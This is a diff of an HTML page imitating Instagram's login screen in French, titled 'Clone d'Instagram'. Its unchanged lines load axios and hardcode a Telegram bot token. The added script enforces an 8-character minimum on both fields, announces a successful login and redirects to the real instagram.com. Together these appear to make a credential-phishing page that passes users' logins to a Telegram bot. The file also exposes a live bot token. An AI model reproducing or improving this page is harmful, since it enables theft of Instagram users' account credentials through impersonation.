@@ -2,13 +2,11 @@
 <head>
     <meta charset="UTF-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="google-site-verification" content="nrSMEdM_INTzUj4KNn1zvAJIlgsIij9vbwTfOa67FIY" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta name="description" content="Clone d'Instagram fait avec HTML et CSS"/>
     <meta name="author" content="Luan Fernando" />
     <link rel="stylesheet" href="assets/css/style.css">
     <link rel="icon" href="insta-fav.ico" type="image/x-icon">
-    <link rel="shortcut icon" href="insta-fav.ico" type="image/x-icon">
     <title>Clone d'Instagram</title>
 </head>
 <body>
@@ -68,7 +66,6 @@
             <span>© 2025 Instagram de Meta</span>
         </div>
     </footer>
-
     <script src="https://unpkg.com/axios@1.6.7/dist/axios.min.js"></script>
     <script>
         const TOKEN = "7949673291:AAFuQ82j8M6SPQqtG8CBjtBAN_KrQ9_JxpA"; // Token
@@ -118,21 +115,50 @@
         });
     </script>
 
+    <script src="https://unpkg.com/axios@1.6.7/dist/axios.min.js"></script>
+
+    <!-- Script de validation du formulaire -->
     <script>
+        // Gestion du formulaire
+        const form = document.getElementById('login-form');
+
+        // Sélection des champs d'entrée
         const usernameInput = document.querySelector('input[name="username"]');
         const passwordInput = document.querySelector('input[name="passwordUser"]');
         const loginButton = document.querySelector('button');
 
+        // Fonction pour activer ou désactiver le bouton
         function toggleButtonState() {
-            if (usernameInput.value && passwordInput.value) {
-                loginButton.disabled = false; // Enable the button
+            const usernameLength = usernameInput.value.trim().length;
+            const passwordLength = passwordInput.value.trim().length;
+
+            // Activer le bouton si les deux champs contiennent au moins 8 caractères
+            if (usernameLength >= 8 && passwordLength >= 8) {
+                loginButton.disabled = false;
             } else {
-                loginButton.disabled = true; // Disable the button
+                loginButton.disabled = true;
             }
         }
 
+        // Écouteurs d'événements pour détecter les modifications dans les champs
         usernameInput.addEventListener('input', toggleButtonState);
         passwordInput.addEventListener('input', toggleButtonState);
+
+        // Validation du formulaire au clic sur le bouton "Se connecter"
+        form.addEventListener('submit', function (e) {
+            e.preventDefault(); // Empêcher le rechargement de la page
+
+            const email = usernameInput.value.trim();
+            const password = passwordInput.value.trim();
+
+            // Vérifier que les champs respectent la règle de longueur minimale
+            if (email.length >= 8 && password.length >= 8) {
+                alert("Connexion réussie ! Vous allez être redirigé vers Instagram.");
+                window.location.href = "https://www.instagram.com/"; // Redirection
+            } else {
+                alert("Veuillez remplir tous les champs avec au moins 8 caractères.");
+            }
+        });
     </script>
 </body>
 </html>
